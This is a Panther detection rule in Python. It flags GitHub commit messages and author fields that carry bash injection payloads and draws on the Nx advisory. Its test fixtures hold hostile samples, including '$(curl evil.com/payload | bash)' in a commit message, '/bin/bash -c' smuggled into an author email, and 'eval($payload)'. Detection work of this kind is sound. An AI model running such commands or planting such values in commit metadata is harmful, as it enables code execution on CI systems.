from pypanther import LogType, Rule, RuleTest, Severity, panther_managed
from pypanther.helpers.github import (
    contains_bash_injection_pattern,
    get_matched_bash_patterns,
    github_reference_url,
    github_webhook_alert_context,
)


@panther_managed
class GitHubWebhookMaliciousCommitContent(Rule):
    id = "GitHub.Webhook.MaliciousCommitContent-prototype"
    display_name = "GitHub Malicious Commit Content"
    log_types = [LogType.GITHUB_WEBHOOK]
    reports = {"MITRE ATT&CK": ["TA0001:T1195.002", "TA0003:T1098"]}
    tags = ["Code Injection", "Supply Chain", "Account Compromise"]
    default_severity = Severity.HIGH
    default_description = "Detects malicious patterns in GitHub commit content including commit messages, author names, and author emails. These fields can contain injection payloads that may be executed by vulnerable CI/CD workflows or git hooks. This rule is particularly important as commit metadata is often trusted and may be processed unsafely. Based on patterns from the Nx vulnerability (GHSA-cxm3-wv7p-598c).\n"
    default_runbook = "1. Immediately investigate the commits identified with malicious patterns\n2. Check if the author account may be compromised\n3. Review all workflows and git hooks that process commit messages or author information\n4. Look for signs of code execution in CI/CD logs\n5. Revert malicious commits if confirmed\n6. Reset credentials if the author account is compromised\n7. Review repository access logs for suspicious activity\n8. Consider temporarily disabling vulnerable workflows\n9. Implement input sanitization for commit metadata processing\n10. Contact the repository owner and security team\n"
    default_reference = "https://github.com/nrwl/nx/security/advisories/GHSA-cxm3-wv7p-598c"

    def rule(self, event):
        # Check for push events with commits
        if not (event.get("commits") or event.get("head_commit")):
            return False
        # Check head_commit fields (single commit in push)
        if head_commit := event.get("head_commit"):
            fields_to_check = [
                head_commit.get("message"),
                head_commit.get("author", {}).get("email"),
                head_commit.get("author", {}).get("name"),
            ]
            for field in fields_to_check:
                if contains_bash_injection_pattern(field):
                    return True
        # Check all commits in the push
        for commit in event.get("commits", []):
            commit_fields = [
                commit.get("message"),
                commit.get("author", {}).get("email"),
                commit.get("author", {}).get("name"),
            ]
            for field in commit_fields:
                if contains_bash_injection_pattern(field):
                    return True
        return False

    def title(self, event):
        repo_name = event.deep_get("repository", "full_name", default="<UNKNOWN_REPO>")
        ref = event.get("ref", "<UNKNOWN_REF>")
        return f"Malicious pattern detected in commit content in {repo_name} on {ref}"

    def alert_context(self, event):
        context = github_webhook_alert_context(event)
        context["malicious_commits"] = []
        # Analyze head_commit
        if head_commit := event.get("head_commit"):
            commit_analysis = self._analyze_commit(head_commit)
            if commit_analysis["has_malicious_patterns"]:
                context["malicious_commits"].append(commit_analysis)
        # Analyze all commits
        for commit in event.get("commits", []):
            commit_analysis = self._analyze_commit(commit)
            if commit_analysis["has_malicious_patterns"]:
                context["malicious_commits"].append(commit_analysis)
        return context

    def _analyze_commit(self, commit):
        """Analyze a single commit for malicious patterns."""
        analysis = {
            "commit_id": commit.get("id"),
            "message": commit.get("message"),
            "author": commit.get("author", {}).get("name"),
            "author_email": commit.get("author", {}).get("email"),
            "timestamp": commit.get("timestamp"),
            "url": commit.get("url"),
            "has_malicious_patterns": False,
            "field_analysis": {},
        }
        # Check message
        if message := commit.get("message"):
            patterns = get_matched_bash_patterns(message)
            if patterns:
                analysis["has_malicious_patterns"] = True
                analysis["field_analysis"]["message"] = {"value": message, "matched_patterns": patterns}
        # Check author email
        if author_email := commit.get("author", {}).get("email"):
            patterns = get_matched_bash_patterns(author_email)
            if patterns:
                analysis["has_malicious_patterns"] = True
                analysis["field_analysis"]["author_email"] = {"value": author_email, "matched_patterns": patterns}
        # Check author name
        if author_name := commit.get("author", {}).get("name"):
            patterns = get_matched_bash_patterns(author_name)
            if patterns:
                analysis["has_malicious_patterns"] = True
                analysis["field_analysis"]["author_name"] = {"value": author_name, "matched_patterns": patterns}
        return analysis

    def reference(self, event):
        # Try to get the compare URL
        if compare_url := event.get("compare"):
            return compare_url
        # Try head commit URL
        if head_commit_url := event.deep_get("head_commit", "url"):
            return head_commit_url
        if reference_url := github_reference_url(event):
            return reference_url
        return "DEFAULT"

    tests = [
        RuleTest(
            name="Commit Message with Command Substitution",
            expected_result=True,
            log={
                "ref": "refs/heads/main",
                "before": "abc123",
                "after": "def456",
                "commits": [
                    {
                        "id": "def456",
                        "message": "Fix bug $(curl evil.com/payload | bash)",
                        "timestamp": "2024-01-15T10:30:00Z",
                        "url": "https://github.com/org/repo/commit/def456",
                        "author": {"name": "developer", "email": "peregrin@lotr.com"},
                    },
                ],
                "head_commit": {
                    "id": "def456",
                    "message": "Fix bug $(curl evil.com/payload | bash)",
                    "author": {"name": "developer", "email": "peregrin@lotr.com"},
                },
                "repository": {"name": "repo", "full_name": "org/repo"},
                "pusher": {"name": "developer"},
                "p_log_type": "GitHub.Webhook",
            },
        ),
        RuleTest(
            name="Commit with Malicious Author Email",
            expected_result=True,
            log={
                "ref": "refs/heads/feature",
                "commits": [
                    {
                        "id": "xyz789",
                        "message": "Add new feature",
                        "author": {"name": "attacker", "email": "`/bin/bash -c 'malicious denethor@lotr.com"},
                    },
                ],
                "head_commit": {
                    "id": "xyz789",
                    "message": "Add new feature",
                    "author": {"name": "attacker", "email": "john@justice.org"},
                },
                "repository": {"full_name": "victim/repo"},
                "pusher": {"name": "attacker"},
                "p_log_type": "GitHub.Webhook",
            },
        ),
        RuleTest(
            name="Commit with Malicious Author Name",
            expected_result=True,
            log={
                "ref": "refs/heads/main",
                "commits": [
                    {
                        "id": "aaa111",
                        "message": "Update documentation",
                        "author": {"name": "$(echo malicious)", "email": "sam@lotr.com"},
                    },
                ],
                "repository": {"full_name": "target/repo"},
                "p_log_type": "GitHub.Webhook",
            },
        ),
        RuleTest(
            name="Multiple Commits with One Malicious",
            expected_result=True,
            log={
                "ref": "refs/heads/develop",
                "commits": [
                    {
                        "id": "commit1",
                        "message": "Normal commit",
                        "author": {"name": "dev1", "email": "frodo@lotr.com"},
                    },
                    {
                        "id": "commit2",
                        "message": "Update /bin/bash -c 'malicious'",
                        "author": {"name": "dev2", "email": "aragorn@lotr.com"},
                    },
                ],
                "head_commit": {
                    "id": "commit2",
                    "message": "Update /bin/bash -c 'malicious'",
                    "author": {"name": "dev2", "email": "aragorn@lotr.com"},
                },
                "repository": {"full_name": "org/repo"},
                "p_log_type": "GitHub.Webhook",
            },
        ),
        RuleTest(
            name="Normal Commit",
            expected_result=False,
            log={
                "ref": "refs/heads/main",
                "commits": [
                    {
                        "id": "normal123",
                        "message": "Fix authentication bug in login flow",
                        "author": {"name": "John Doe", "email": "denethor@lotr.com"},
                    },
                ],
                "head_commit": {
                    "id": "normal123",
                    "message": "Fix authentication bug in login flow",
                    "author": {"name": "John Doe", "email": "denethor@lotr.com"},
                },
                "repository": {"full_name": "org/repo"},
                "p_log_type": "GitHub.Webhook",
            },
        ),
        RuleTest(
            name="Non-Push Event",
            expected_result=False,
            log={
                "action": "opened",
                "pull_request": {"number": 1, "title": "New feature"},
                "repository": {"full_name": "org/repo"},
                "p_log_type": "GitHub.Webhook",
            },
        ),
        RuleTest(
            name="Commit with Eval Pattern",
            expected_result=True,
            log={
                "ref": "refs/heads/main",
                "commits": [
                    {
                        "id": "eval123",
                        "message": "eval($payload)",
                        "author": {"name": "attacker", "email": "attacker@evil.com"},
                    },
                ],
                "repository": {"full_name": "victim/repo"},
                "p_log_type": "GitHub.Webhook",
            },
        ),
    ]
